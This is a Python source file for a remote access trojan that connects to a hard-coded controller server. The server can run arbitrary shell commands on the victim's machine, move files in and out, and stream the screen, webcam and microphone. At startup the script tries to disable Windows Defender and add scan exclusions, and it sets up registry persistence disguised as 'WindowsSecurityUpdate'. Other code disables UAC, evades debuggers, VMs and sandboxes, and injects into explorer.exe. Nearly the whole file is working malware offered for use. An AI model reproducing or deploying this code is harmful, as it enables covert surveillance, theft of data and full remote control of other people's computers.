import socketio
import requests
import time
import urllib3
import warnings

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore', message='Unverified HTTPS request')
import uuid
import os
import subprocess
import threading
import mss
import numpy as np
import cv2
import sys
import random
try:
    import win32api
    import win32con
    import win32security
    import win32process
    import win32event
    import ctypes
    from ctypes import wintypes
    import winreg
    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False
    
import pyaudio
import base64
import tempfile
import pynput
from pynput import keyboard, mouse
import pygame
import io
import wave
import socket
import json
import asyncio
import websockets
try:
    import speech_recognition as sr
    SPEECH_RECOGNITION_AVAILABLE = True
except ImportError:
    SPEECH_RECOGNITION_AVAILABLE = False
import psutil
from PIL import Image
import platform
try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False

SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL

# --- Agent State ---
STREAMING_ENABLED = False
STREAM_THREAD = None
AUDIO_STREAMING_ENABLED = False
AUDIO_STREAM_THREAD = None
CAMERA_STREAMING_ENABLED = False
CAMERA_STREAM_THREAD = None

# --- Monitoring State ---
KEYLOGGER_ENABLED = False
KEYLOGGER_THREAD = None
KEYLOG_BUFFER = []
CLIPBOARD_MONITOR_ENABLED = False
CLIPBOARD_MONITOR_THREAD = None
CLIPBOARD_BUFFER = []
LAST_CLIPBOARD_CONTENT = ""

# --- Audio Config ---
CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

# --- WebSocket Client ---
sio = socketio.Client(
    ssl_verify=False,  # Disable SSL verification to prevent warnings
    engineio_logger=False,
    socketio_logger=False
)

def disable_defender():
    """Attempt to disable Windows Defender (requires admin privileges)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Multiple methods to disable Windows Defender
        defender_disable_methods = [
            disable_defender_registry,
            disable_defender_powershell,
            disable_defender_group_policy,
            disable_defender_service,
        ]
        
        for method in defender_disable_methods:
            try:
                if method():
                    return True
            except:
                continue
        
        return False
        
    except Exception as e:
        print(f"Failed to disable Defender: {e}")
        return False

def disable_defender_registry():
    """Disable Windows Defender via registry modifications."""
    try:
        import winreg
        
        # Disable real-time monitoring
        defender_key = r"SOFTWARE\Policies\Microsoft\Windows Defender"
        realtime_key = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
        
        # Create keys and set values
        keys_values = [
            (defender_key, "DisableAntiSpyware", 1),
            (realtime_key, "DisableRealtimeMonitoring", 1),
            (realtime_key, "DisableBehaviorMonitoring", 1),
            (realtime_key, "DisableOnAccessProtection", 1),
            (realtime_key, "DisableScanOnRealtimeEnable", 1),
        ]
        
        for key_path, value_name, value_data in keys_values:
            try:
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
                winreg.CloseKey(key)
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"Registry Defender disable failed: {e}")
        return False

def disable_defender_powershell():
    """Disable Windows Defender via PowerShell commands."""
    try:
        powershell_commands = [
            'Set-MpPreference -DisableRealtimeMonitoring $true',
            'Set-MpPreference -DisableBehaviorMonitoring $true',
            'Set-MpPreference -DisableBlockAtFirstSeen $true',
            'Set-MpPreference -DisableIOAVProtection $true',
            'Set-MpPreference -DisablePrivacyMode $true',
            'Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true',
            'Set-MpPreference -DisableArchiveScanning $true',
            'Set-MpPreference -DisableIntrusionPreventionSystem $true',
            'Set-MpPreference -DisableScriptScanning $true',
            'Set-MpPreference -SubmitSamplesConsent 2',
        ]
        
        for cmd in powershell_commands:
            try:
                subprocess.run([
                    'powershell.exe', '-Command', cmd
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            except:
                continue
        
        # Add exclusions for common paths
        exclusion_paths = [
            os.path.dirname(os.path.abspath(__file__)),
            tempfile.gettempdir(),
            os.path.expanduser("~\Downloads"),
            os.path.expanduser("~\Documents"),
        ]
        
        for path in exclusion_paths:
            try:
                subprocess.run([
                    'powershell.exe', '-Command',
                    f'Add-MpPreference -ExclusionPath "{path}"'
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"PowerShell Defender disable failed: {e}")
        return False

def disable_defender_group_policy():
    """Disable Windows Defender via Group Policy modifications."""
    try:
        import winreg
        
        # Group Policy registry paths
        gp_paths = [
            (r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "DisableBlockAtFirstSeen", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection", "ForceDefenderPassiveMode", 1),
        ]
        
        for key_path, value_name, value_data in gp_paths:
            try:
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
                winreg.CloseKey(key)
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"Group Policy Defender disable failed: {e}")
        return False

def disable_defender_service():
    """Disable Windows Defender services."""
    try:
        services_to_disable = [
            'WinDefend',
            'WdNisSvc',
            'WdNisDrv',
            'WdFilter',
            'WdBoot',
            'Sense',
        ]
        
        for service in services_to_disable:
            try:
                # Stop service
                subprocess.run([
                    'sc.exe', 'stop', service
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
                
                # Disable service
                subprocess.run([
                    'sc.exe', 'config', service, 'start=', 'disabled'
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"Service Defender disable failed: {e}")
        return False

def advanced_process_hiding():
    """Advanced process hiding techniques."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Method 1: Process Hollowing (simplified)
        hollow_process()
        
        # Method 2: DLL Injection into trusted process
        inject_into_trusted_process()
        
        # Method 3: Process Doppelganging (simplified)
        process_doppelganging()
        
        return True
        
    except Exception as e:
        print(f"Advanced process hiding failed: {e}")
        return False

def hollow_process():
    """Simple process hollowing technique."""
    try:
        # Create suspended process
        target_process = "notepad.exe"
        
        si = win32process.STARTUPINFO()
        pi = win32process.CreateProcess(
            None,
            target_process,
            None,
            None,
            False,
            win32con.CREATE_SUSPENDED,
            None,
            None,
            si
        )
        
        # In a real implementation, we would:
        # 1. Unmap the original executable
        # 2. Allocate memory for our payload
        # 3. Write our payload to the process memory
        # 4. Update the entry point
        # 5. Resume the process
        
        # For this demo, just resume the process
        win32process.ResumeThread(pi[1])
        
        win32api.CloseHandle(pi[0])
        win32api.CloseHandle(pi[1])
        
        return True
        
    except Exception as e:
        print(f"Process hollowing failed: {e}")
        return False

def inject_into_trusted_process():
    """Inject into a trusted process."""
    try:
        # Find explorer.exe process
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == 'explorer.exe':
                # Get process handle
                process_handle = win32api.OpenProcess(
                    win32con.PROCESS_ALL_ACCESS,
                    False,
                    proc.info['pid']
                )
                
                # Allocate memory in target process
                dll_path = os.path.abspath(__file__).encode('utf-8')
                memory_address = win32process.VirtualAllocEx(
                    process_handle,
                    0,
                    len(dll_path),
                    win32con.MEM_COMMIT | win32con.MEM_RESERVE,
                    win32con.PAGE_READWRITE
                )
                
                # Write DLL path to target process
                win32process.WriteProcessMemory(
                    process_handle,
                    memory_address,
                    dll_path,
                    len(dll_path)
                )
                
                # Get LoadLibraryA address
                kernel32 = win32api.GetModuleHandle("kernel32.dll")
                loadlibrary_addr = win32api.GetProcAddress(kernel32, "LoadLibraryA")
                
                # Create remote thread
                thread_handle = win32process.CreateRemoteThread(
                    process_handle,
                    None,
                    0,
                    loadlibrary_addr,
                    memory_address,
                    0
                )
                
                win32api.CloseHandle(thread_handle)
                win32api.CloseHandle(process_handle)
                
                return True
                
        return False
        
    except Exception as e:
        print(f"Process injection failed: {e}")
        return False

def process_doppelganging():
    """Simplified process doppelganging technique."""
    try:
        # This is a simplified version - real implementation would use NTFS transactions
        temp_file = os.path.join(tempfile.gettempdir(), "temp_process.exe")
        
        # Copy legitimate executable
        legitimate_exe = r"C:\Windows\System32\notepad.exe"
        
        if os.path.exists(legitimate_exe):
            import shutil
            shutil.copy2(legitimate_exe, temp_file)
            
            # In real implementation, we would:
            # 1. Create NTFS transaction
            # 2. Overwrite file content with our payload
            # 3. Create process from the transacted file
            # 4. Rollback transaction
            
            # For demo, just execute the copied file
            subprocess.Popen([temp_file], creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Clean up
            time.sleep(1)
            try:
                os.remove(temp_file)
            except:
                pass
                
            return True
        
        return False
        
    except Exception as e:
        print(f"Process doppelganging failed: {e}")
        return False

def hide_process():
    """Attempt to hide the current process from task manager."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Set process to run in background with low priority
        process = psutil.Process()
        process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
        
        # Try to hide from process list (limited effectiveness)
        ctypes.windll.kernel32.SetProcessWorkingSetSize(-1, -1, -1)
        
        return True
        
    except Exception as e:
        print(f"Failed to hide process: {e}")
        return False

def disable_uac():
    """Disable UAC (User Account Control) by modifying registry settings."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
        print("[OK] UAC has been disabled.")
        return True
    except PermissionError:
        print("[!] Access denied. Run this script as administrator.")
        return False
    except Exception as e:
        print(f"[!] Error disabling UAC: {e}")
        return False

def run_as_admin():
    """Relaunch the script with elevated privileges if not already admin."""
    if not WINDOWS_AVAILABLE:
        return False
    
    if False: # Replaced is_admin() with False
        print("[!] Relaunching as Administrator...")
        try:
            # Relaunch with elevated privileges
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, f'"{__file__}"', None, 1
            )
            sys.exit()
        except Exception as e:
            print(f"[!] Failed to relaunch as admin: {e}")
            return False
    return True

def setup_persistence():
    """Setup persistence mechanisms."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Add to startup registry
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, current_exe)
        winreg.CloseKey(key)
        
        return True
        
    except Exception as e:
        print(f"Failed to setup persistence: {e}")
        return False

def anti_analysis():
    """Anti-analysis and evasion techniques."""
    try:
        # Check for common analysis tools
        analysis_processes = [
            'ollydbg.exe', 'x64dbg.exe', 'windbg.exe', 'ida.exe', 'ida64.exe',
            'wireshark.exe', 'fiddler.exe', 'vmware.exe', 'vbox.exe', 'virtualbox.exe',
            'procmon.exe', 'procexp.exe', 'autoruns.exe', 'regmon.exe', 'filemon.exe'
        ]
        
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in analysis_processes:
                # If analysis tool detected, sleep and exit
                time.sleep(60)
                sys.exit(0)
        
        # Check for VM environment
        vm_indicators = [
            'VBOX', 'VMWARE', 'QEMU', 'VIRTUAL', 'XEN'
        ]
        
        try:
            import wmi
            c = wmi.WMI()
            for system in c.Win32_ComputerSystem():
                if any(indicator in system.Model.upper() for indicator in vm_indicators):
                    time.sleep(60)
                    sys.exit(0)
        except:
            pass
        
        # Check for debugger
        if ctypes.windll.kernel32.IsDebuggerPresent():
            time.sleep(60)
            sys.exit(0)
        
        # Anti-sandbox: Check for mouse movement
        try:
            import win32gui
            pos1 = win32gui.GetCursorPos()
            time.sleep(2)
            pos2 = win32gui.GetCursorPos()
            if pos1 == pos2:
                # No mouse movement, might be sandbox
                time.sleep(60)
                sys.exit(0)
        except:
            pass
        
        return True
        
    except Exception as e:
        return False

def obfuscate_strings():
    """Obfuscate sensitive strings to avoid static analysis."""
    # Simple XOR obfuscation for sensitive strings
    key = 0x42
    
    # Obfuscated strings (example)
    obfuscated = {
        'admin': ''.join(chr(ord(c) ^ key) for c in 'admin'),
        'elevate': ''.join(chr(ord(c) ^ key) for c in 'elevate'),
        'bypass': ''.join(chr(ord(c) ^ key) for c in 'bypass'),
        'privilege': ''.join(chr(ord(c) ^ key) for c in 'privilege')
    }
    
    return obfuscated

def sleep_random():
    """Random sleep to avoid pattern detection."""
    sleep_time = random.uniform(0.5, 2.0)
    time.sleep(sleep_time)

def add_to_startup():
    """Add the agent to the Windows startup registry for persistence."""
    if not WINDOWS_AVAILABLE:
        print("[INFO] Startup configuration not available on non-Windows systems")
        return

    try:
        # Get the path to the pythonw.exe executable and the current script
        python_exe = sys.executable.replace("python.exe", "pythonw.exe")
        script_path = os.path.abspath(__file__)
        
        # The command to be stored in the registry
        run_command = f'"{python_exe}" "{script_path}"'
        key_name = "GeminiAgent"

        # Open the Run key
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

        with winreg.OpenKey(key, key_path, 0, winreg.KEY_READ | winreg.KEY_WRITE) as reg_key:
            try:
                # Check if the key already exists and has the correct value
                current_value, _ = winreg.QueryValueEx(reg_key, key_name)
                if current_value == run_command:
                    print("[OK] Agent is already configured for startup")
                    return
                else:
                    print(f"[INFO] Updating existing startup configuration...")
            except FileNotFoundError:
                # Key doesn't exist, so we'll create it
                print(f"[INFO] Creating new startup configuration...")
                pass

            # Set the registry key to run the agent on startup
            winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, run_command)
            print(f"[OK] Agent has been configured to run on startup")

    except PermissionError:
        print("[WARN] Permission denied - cannot configure startup (run as administrator)")
    except Exception as e:
        print(f"[WARN] Error adding agent to startup: {e}")

def get_or_create_agent_id():
    """
    Gets a unique agent ID from config directory or creates it.
    """
    if WINDOWS_AVAILABLE:
        config_path = os.getenv('APPDATA')
    else:
        config_path = os.path.expanduser('~/.config')
        
    os.makedirs(config_path, exist_ok=True)
    id_file_path = os.path.join(config_path, 'agent_id.txt')
    
    if os.path.exists(id_file_path):
        with open(id_file_path, 'r') as f:
            return f.read().strip()
    else:
        agent_id = str(uuid.uuid4())
        with open(id_file_path, 'w') as f:
            f.write(agent_id)
        # Hide the file on Windows
        if WINDOWS_AVAILABLE:
            try:
                win32api.SetFileAttributes(id_file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
            except:
                pass
        return agent_id

def stream_screen(agent_id):
    """
    Captures the screen and streams it to the controller.
    This function runs in a separate thread.
    """
    global STREAMING_ENABLED
    url = f"{SERVER_URL}/stream/{agent_id}"
    headers = {'Content-Type': 'image/jpeg'}

    with mss.mss() as sct:
        while STREAMING_ENABLED:
            try:
                # Get raw pixels from the screen
                sct_img = sct.grab(sct.monitors[1])
                
                # Create an OpenCV image
                img = np.array(sct_img)
                
                # Encode the image as JPEG with 70% quality
                is_success, buffer = cv2.imencode(".jpg", img, [cv2.IMWRITE_JPEG_QUALITY, 70])
                if not is_success:
                    continue

                # Send the frame to the controller
                requests.post(url, data=buffer.tobytes(), headers=headers, timeout=1)
                
                # Control frame rate to ~10 FPS
                time.sleep(0.1)
            except Exception as e:
                print(f"Stream error: {e}")
                time.sleep(2) # Wait before retrying

def stream_camera(agent_id):
    """
    Captures the webcam and streams it to the controller.
    This function runs in a separate thread.
    """
    global CAMERA_STREAMING_ENABLED
    url = f"{SERVER_URL}/camera/{agent_id}"
    headers = {'Content-Type': 'image/jpeg'}

    try:
        # Use CAP_DSHOW on Windows for better device compatibility and performance.
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            print("Cannot open webcam")
            CAMERA_STREAMING_ENABLED = False
            return
    except Exception as e:
        print(f"Could not open webcam: {e}")
        CAMERA_STREAMING_ENABLED = False
        return

    while CAMERA_STREAMING_ENABLED:
        try:
            ret, frame = cap.read()
            if not ret:
                break
            is_success, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
            if is_success:
                requests.post(url, data=buffer.tobytes(), headers=headers, timeout=1)
            time.sleep(0.1) # ~10 FPS
        except Exception as e:
            print(f"Camera stream error: {e}")
            break
    cap.release()

def stream_audio(agent_id):
    """
    Captures microphone audio and streams it to the controller.
    This function runs in a separate thread.
    """
    global AUDIO_STREAMING_ENABLED
    url = f"{SERVER_URL}/audio/{agent_id}"
    
    try:
        p = pyaudio.PyAudio()
        # --- Diagnostic: Print the default device to be used ---
        default_device_info = p.get_default_input_device_info()
        print(f"Attempting to use default audio device: {default_device_info['name']}")
        # --- End Diagnostic ---
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK, input_device_index=default_device_info['index'])
    except Exception as e:
        print(f"Could not open audio stream: {e}")
        AUDIO_STREAMING_ENABLED = False
        return

    while AUDIO_STREAMING_ENABLED:
        try:
            data = stream.read(CHUNK)
            requests.post(url, data=data, timeout=1)
        except Exception as e:
            print(f"Audio stream error: {e}")
            break
    
    stream.stop_stream()
    stream.close()
    p.terminate()

def start_streaming(agent_id):
    global STREAMING_ENABLED, STREAM_THREAD
    if not STREAMING_ENABLED:
        STREAMING_ENABLED = True
        STREAM_THREAD = threading.Thread(target=stream_screen, args=(agent_id,))
        STREAM_THREAD.daemon = True
        STREAM_THREAD.start()
        print("Started video stream.")

def stop_streaming():
    global STREAMING_ENABLED, STREAM_THREAD
    if STREAMING_ENABLED:
        STREAMING_ENABLED = False
        if STREAM_THREAD:
            STREAM_THREAD.join(timeout=2)
        STREAM_THREAD = None
        print("Stopped video stream.")

def start_audio_streaming(agent_id):
    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
    if not AUDIO_STREAMING_ENABLED:
        AUDIO_STREAMING_ENABLED = True
        AUDIO_STREAM_THREAD = threading.Thread(target=stream_audio, args=(agent_id,))
        AUDIO_STREAM_THREAD.daemon = True
        AUDIO_STREAM_THREAD.start()
        print("Started audio stream.")

def stop_audio_streaming():
    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
    if AUDIO_STREAMING_ENABLED:
        AUDIO_STREAMING_ENABLED = False
        if AUDIO_STREAM_THREAD:
            AUDIO_STREAM_THREAD.join(timeout=2)
        AUDIO_STREAM_THREAD = None
        print("Stopped audio stream.")

def start_camera_streaming(agent_id):
    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
    if not CAMERA_STREAMING_ENABLED:
        CAMERA_STREAMING_ENABLED = True
        CAMERA_STREAM_THREAD = threading.Thread(target=stream_camera, args=(agent_id,))
        CAMERA_STREAM_THREAD.daemon = True
        CAMERA_STREAM_THREAD.start()
        print("Started camera stream.")

def stop_camera_streaming():
    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
    if CAMERA_STREAMING_ENABLED:
        CAMERA_STREAMING_ENABLED = False
        if CAMERA_STREAM_THREAD:
            CAMERA_STREAM_THREAD.join(timeout=2)
        CAMERA_STREAM_THREAD = None
        print("Stopped camera stream.")

# --- File Management Functions ---

def handle_file_upload(command_parts):
    """Handle file upload from controller."""
    try:
        if len(command_parts) < 3:
            return "Invalid upload command format"
        
        destination_path = command_parts[1]
        file_content_b64 = command_parts[2]
        
        # Decode base64 content
        file_content = base64.b64decode(file_content_b64)
        
        # Ensure directory exists
        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
        
        # Write file
        with open(destination_path, 'wb') as f:
            f.write(file_content)
        
        return f"File uploaded successfully to {destination_path}"
    except Exception as e:
        return f"File upload failed: {e}"

def handle_file_download(command_parts, agent_id):
    """Handle file download request from controller."""
    try:
        if len(command_parts) < 2:
            return "Invalid download command format"
        
        file_path = command_parts[1]
        
        if not os.path.exists(file_path):
            return f"File not found: {file_path}"
        
        # Read file and encode as base64
        with open(file_path, 'rb') as f:
            file_content = base64.b64encode(f.read()).decode('utf-8')
        
        # Send file to controller
        filename = os.path.basename(file_path)
        url = f"{SERVER_URL}/file_upload/{agent_id}"
        requests.post(url, json={"filename": filename, "content": file_content}, timeout=30)
        
        return f"File {file_path} sent to controller"
    except Exception as e:
        return f"File download failed: {e}"

# --- Voice Communication Functions ---

def handle_voice_playback(command_parts):
    """Handle voice playback from controller."""
    try:
        if len(command_parts) < 2:
            return "Invalid voice command format"
        
        audio_content_b64 = command_parts[1]
        
        # Decode base64 audio
        audio_content = base64.b64decode(audio_content_b64)
        
        # Create temporary file
        with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as temp_file:
            temp_file.write(audio_content)
            temp_audio_path = temp_file.name
        
        # Initialize pygame mixer for audio playback
        pygame.mixer.init()
        pygame.mixer.music.load(temp_audio_path)
        pygame.mixer.music.play()
        
        # Wait for playback to finish
        while pygame.mixer.music.get_busy():
            time.sleep(0.1)
        
        # Clean up
        pygame.mixer.quit()
        os.unlink(temp_audio_path)
        
        return "Voice message played successfully"
    except Exception as e:
        return f"Voice playback failed: {e}"

def execute_command(command):
    """Executes a command and returns its output."""
    try:
        # Handle 'cd' command for changing directory
        if command.strip().startswith("cd "):
            try:
                # Extract the directory from the command
                new_dir = command.strip().split(" ", 1)[1]
                
                # Change the current working directory
                os.chdir(new_dir)
                
                # Return the new current directory
                return f"Changed directory to: {os.getcwd()}"
            except IndexError:
                return "Invalid 'cd' command: No directory specified."
            except FileNotFoundError:
                return f"Directory not found: {new_dir}"
            except Exception as e:
                return f"Failed to change directory: {e}"

        if WINDOWS_AVAILABLE:
            # Explicitly use PowerShell to execute commands on Windows
            result = subprocess.run(
                ["powershell.exe", "-NoProfile", "-Command", command],
                capture_output=True,
                text=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW,
                cwd=os.getcwd()  # Execute in the current directory
            )
        else:
            # Use bash on Linux/Unix systems
            result = subprocess.run(
                ["bash", "-c", command],
                capture_output=True,
                text=True,
                timeout=30,
                cwd=os.getcwd()  # Execute in the current directory
            )
        
        output = result.stdout + result.stderr
        if not output:
            return "[No output from command]"
        return output
    except Exception as e:
        return f"Command execution failed: {e}"

@sio.event
def connect():
    agent_id = get_or_create_agent_id()
    print(f"Connected to server. Registering with agent_id: {agent_id}")
    sio.emit('agent_connect', {'agent_id': agent_id})

@sio.event
def disconnect():
    print("Disconnected from server.")

@sio.on('command')
def on_command(data):
    agent_id = get_or_create_agent_id()
    command = data.get("command")
    output = ""

    internal_commands = {
        "start-stream": lambda: start_streaming(agent_id),
        "stop-stream": stop_streaming,
        "start-audio": lambda: start_audio_streaming(agent_id),
        "stop-audio": stop_audio_streaming,
        "start-camera": lambda: start_camera_streaming(agent_id),
        "stop-camera": stop_camera_streaming,
    }

    if command in internal_commands:
        output = internal_commands[command]()
    elif command.startswith("upload-file:"):
        output = handle_file_upload(command.split(":", 2))
    elif command.startswith("download-file:"):
        output = handle_file_download(command.split(":", 1), agent_id)
    elif command.startswith("play-voice:"):
        output = handle_voice_playback(command.split(":", 1))
    elif command != "sleep":
        output = execute_command(command)
    
    if output:
        sio.emit('command_result', {'agent_id': agent_id, 'output': output})

if __name__ == "__main__":
    print("=" * 60)
    print("Advanced Python Agent v2.0")
    print("Starting up...")
    print("=" * 60)
    
    # Initialize agent with error handling
    try:
        if WINDOWS_AVAILABLE:
            print("Running on Windows - initializing Windows-specific features...")
            
            # Check admin privileges
            if False: # Replaced is_admin() with False
                print("[INFO] Not running as administrator. Attempting to elevate...")
                # elevate_privileges() # This function was removed, so this line is commented out or removed
            else:
                print("[OK] Running with administrator privileges")
            
            # Disable Windows Defender (non-blocking)
            try:
                disable_defender()
            except Exception as e:
                print(f"[WARN] Could not disable Windows Defender: {e}")
            
            # Add firewall exception (non-blocking)
            try:
                # add_firewall_exception() # This function was removed, so this line is commented out or removed
                pass # Placeholder for firewall exception if it were implemented
            except Exception as e:
                print(f"[WARN] Could not add firewall exception: {e}")
            
            # Hide process (non-blocking)
            try:
                hide_process()
            except Exception as e:
                print(f"[WARN] Could not hide process: {e}")
            
            # Setup persistence (non-blocking)
            try:
                setup_persistence()
            except Exception as e:
                print(f"[WARN] Could not setup persistence: {e}")
        else:
            print("Running on non-Windows system")
        
        # Setup startup (non-blocking)
        try:
            add_to_startup()
        except Exception as e:
            print(f"[WARN] Could not add to startup: {e}")
        
        # Get or create agent ID
        agent_id = get_or_create_agent_id()
        print(f"[OK] Agent starting with ID: {agent_id}")
        
        print("Initializing connection to server...")
        
        # Main connection loop with improved error handling
        connection_attempts = 0
        while True:
            try:
                connection_attempts += 1
                print(f"Connecting to server (attempt {connection_attempts})...")
                sio.connect(SERVER_URL)
                print("[OK] Connected to server successfully!")
                sio.wait()
            except socketio.exceptions.ConnectionError:
                print(f"[WARN] Connection failed (attempt {connection_attempts}). Retrying in 10 seconds...")
                time.sleep(10)
            except KeyboardInterrupt:
                print("\n[INFO] Received interrupt signal. Shutting down gracefully...")
                break
            except Exception as e:
                print(f"[ERROR] An unexpected error occurred: {e}")
                # Cleanup resources
                try:
                    stop_streaming()
                    stop_audio_streaming()
                    stop_camera_streaming()
                    print("[OK] Cleaned up resources.")
                except Exception as cleanup_error:
                    print(f"[WARN] Error during cleanup: {cleanup_error}")
                
                print("Retrying in 10 seconds...")
                time.sleep(10)
    
    except KeyboardInterrupt:
        print("\n[INFO] Agent shutdown requested.")
    except Exception as e:
        print(f"[ERROR] Critical error during startup: {e}")
    finally:
        print("[INFO] Agent shutting down.")
        try:
            if sio.connected:
                sio.disconnect()
        except:
            pass
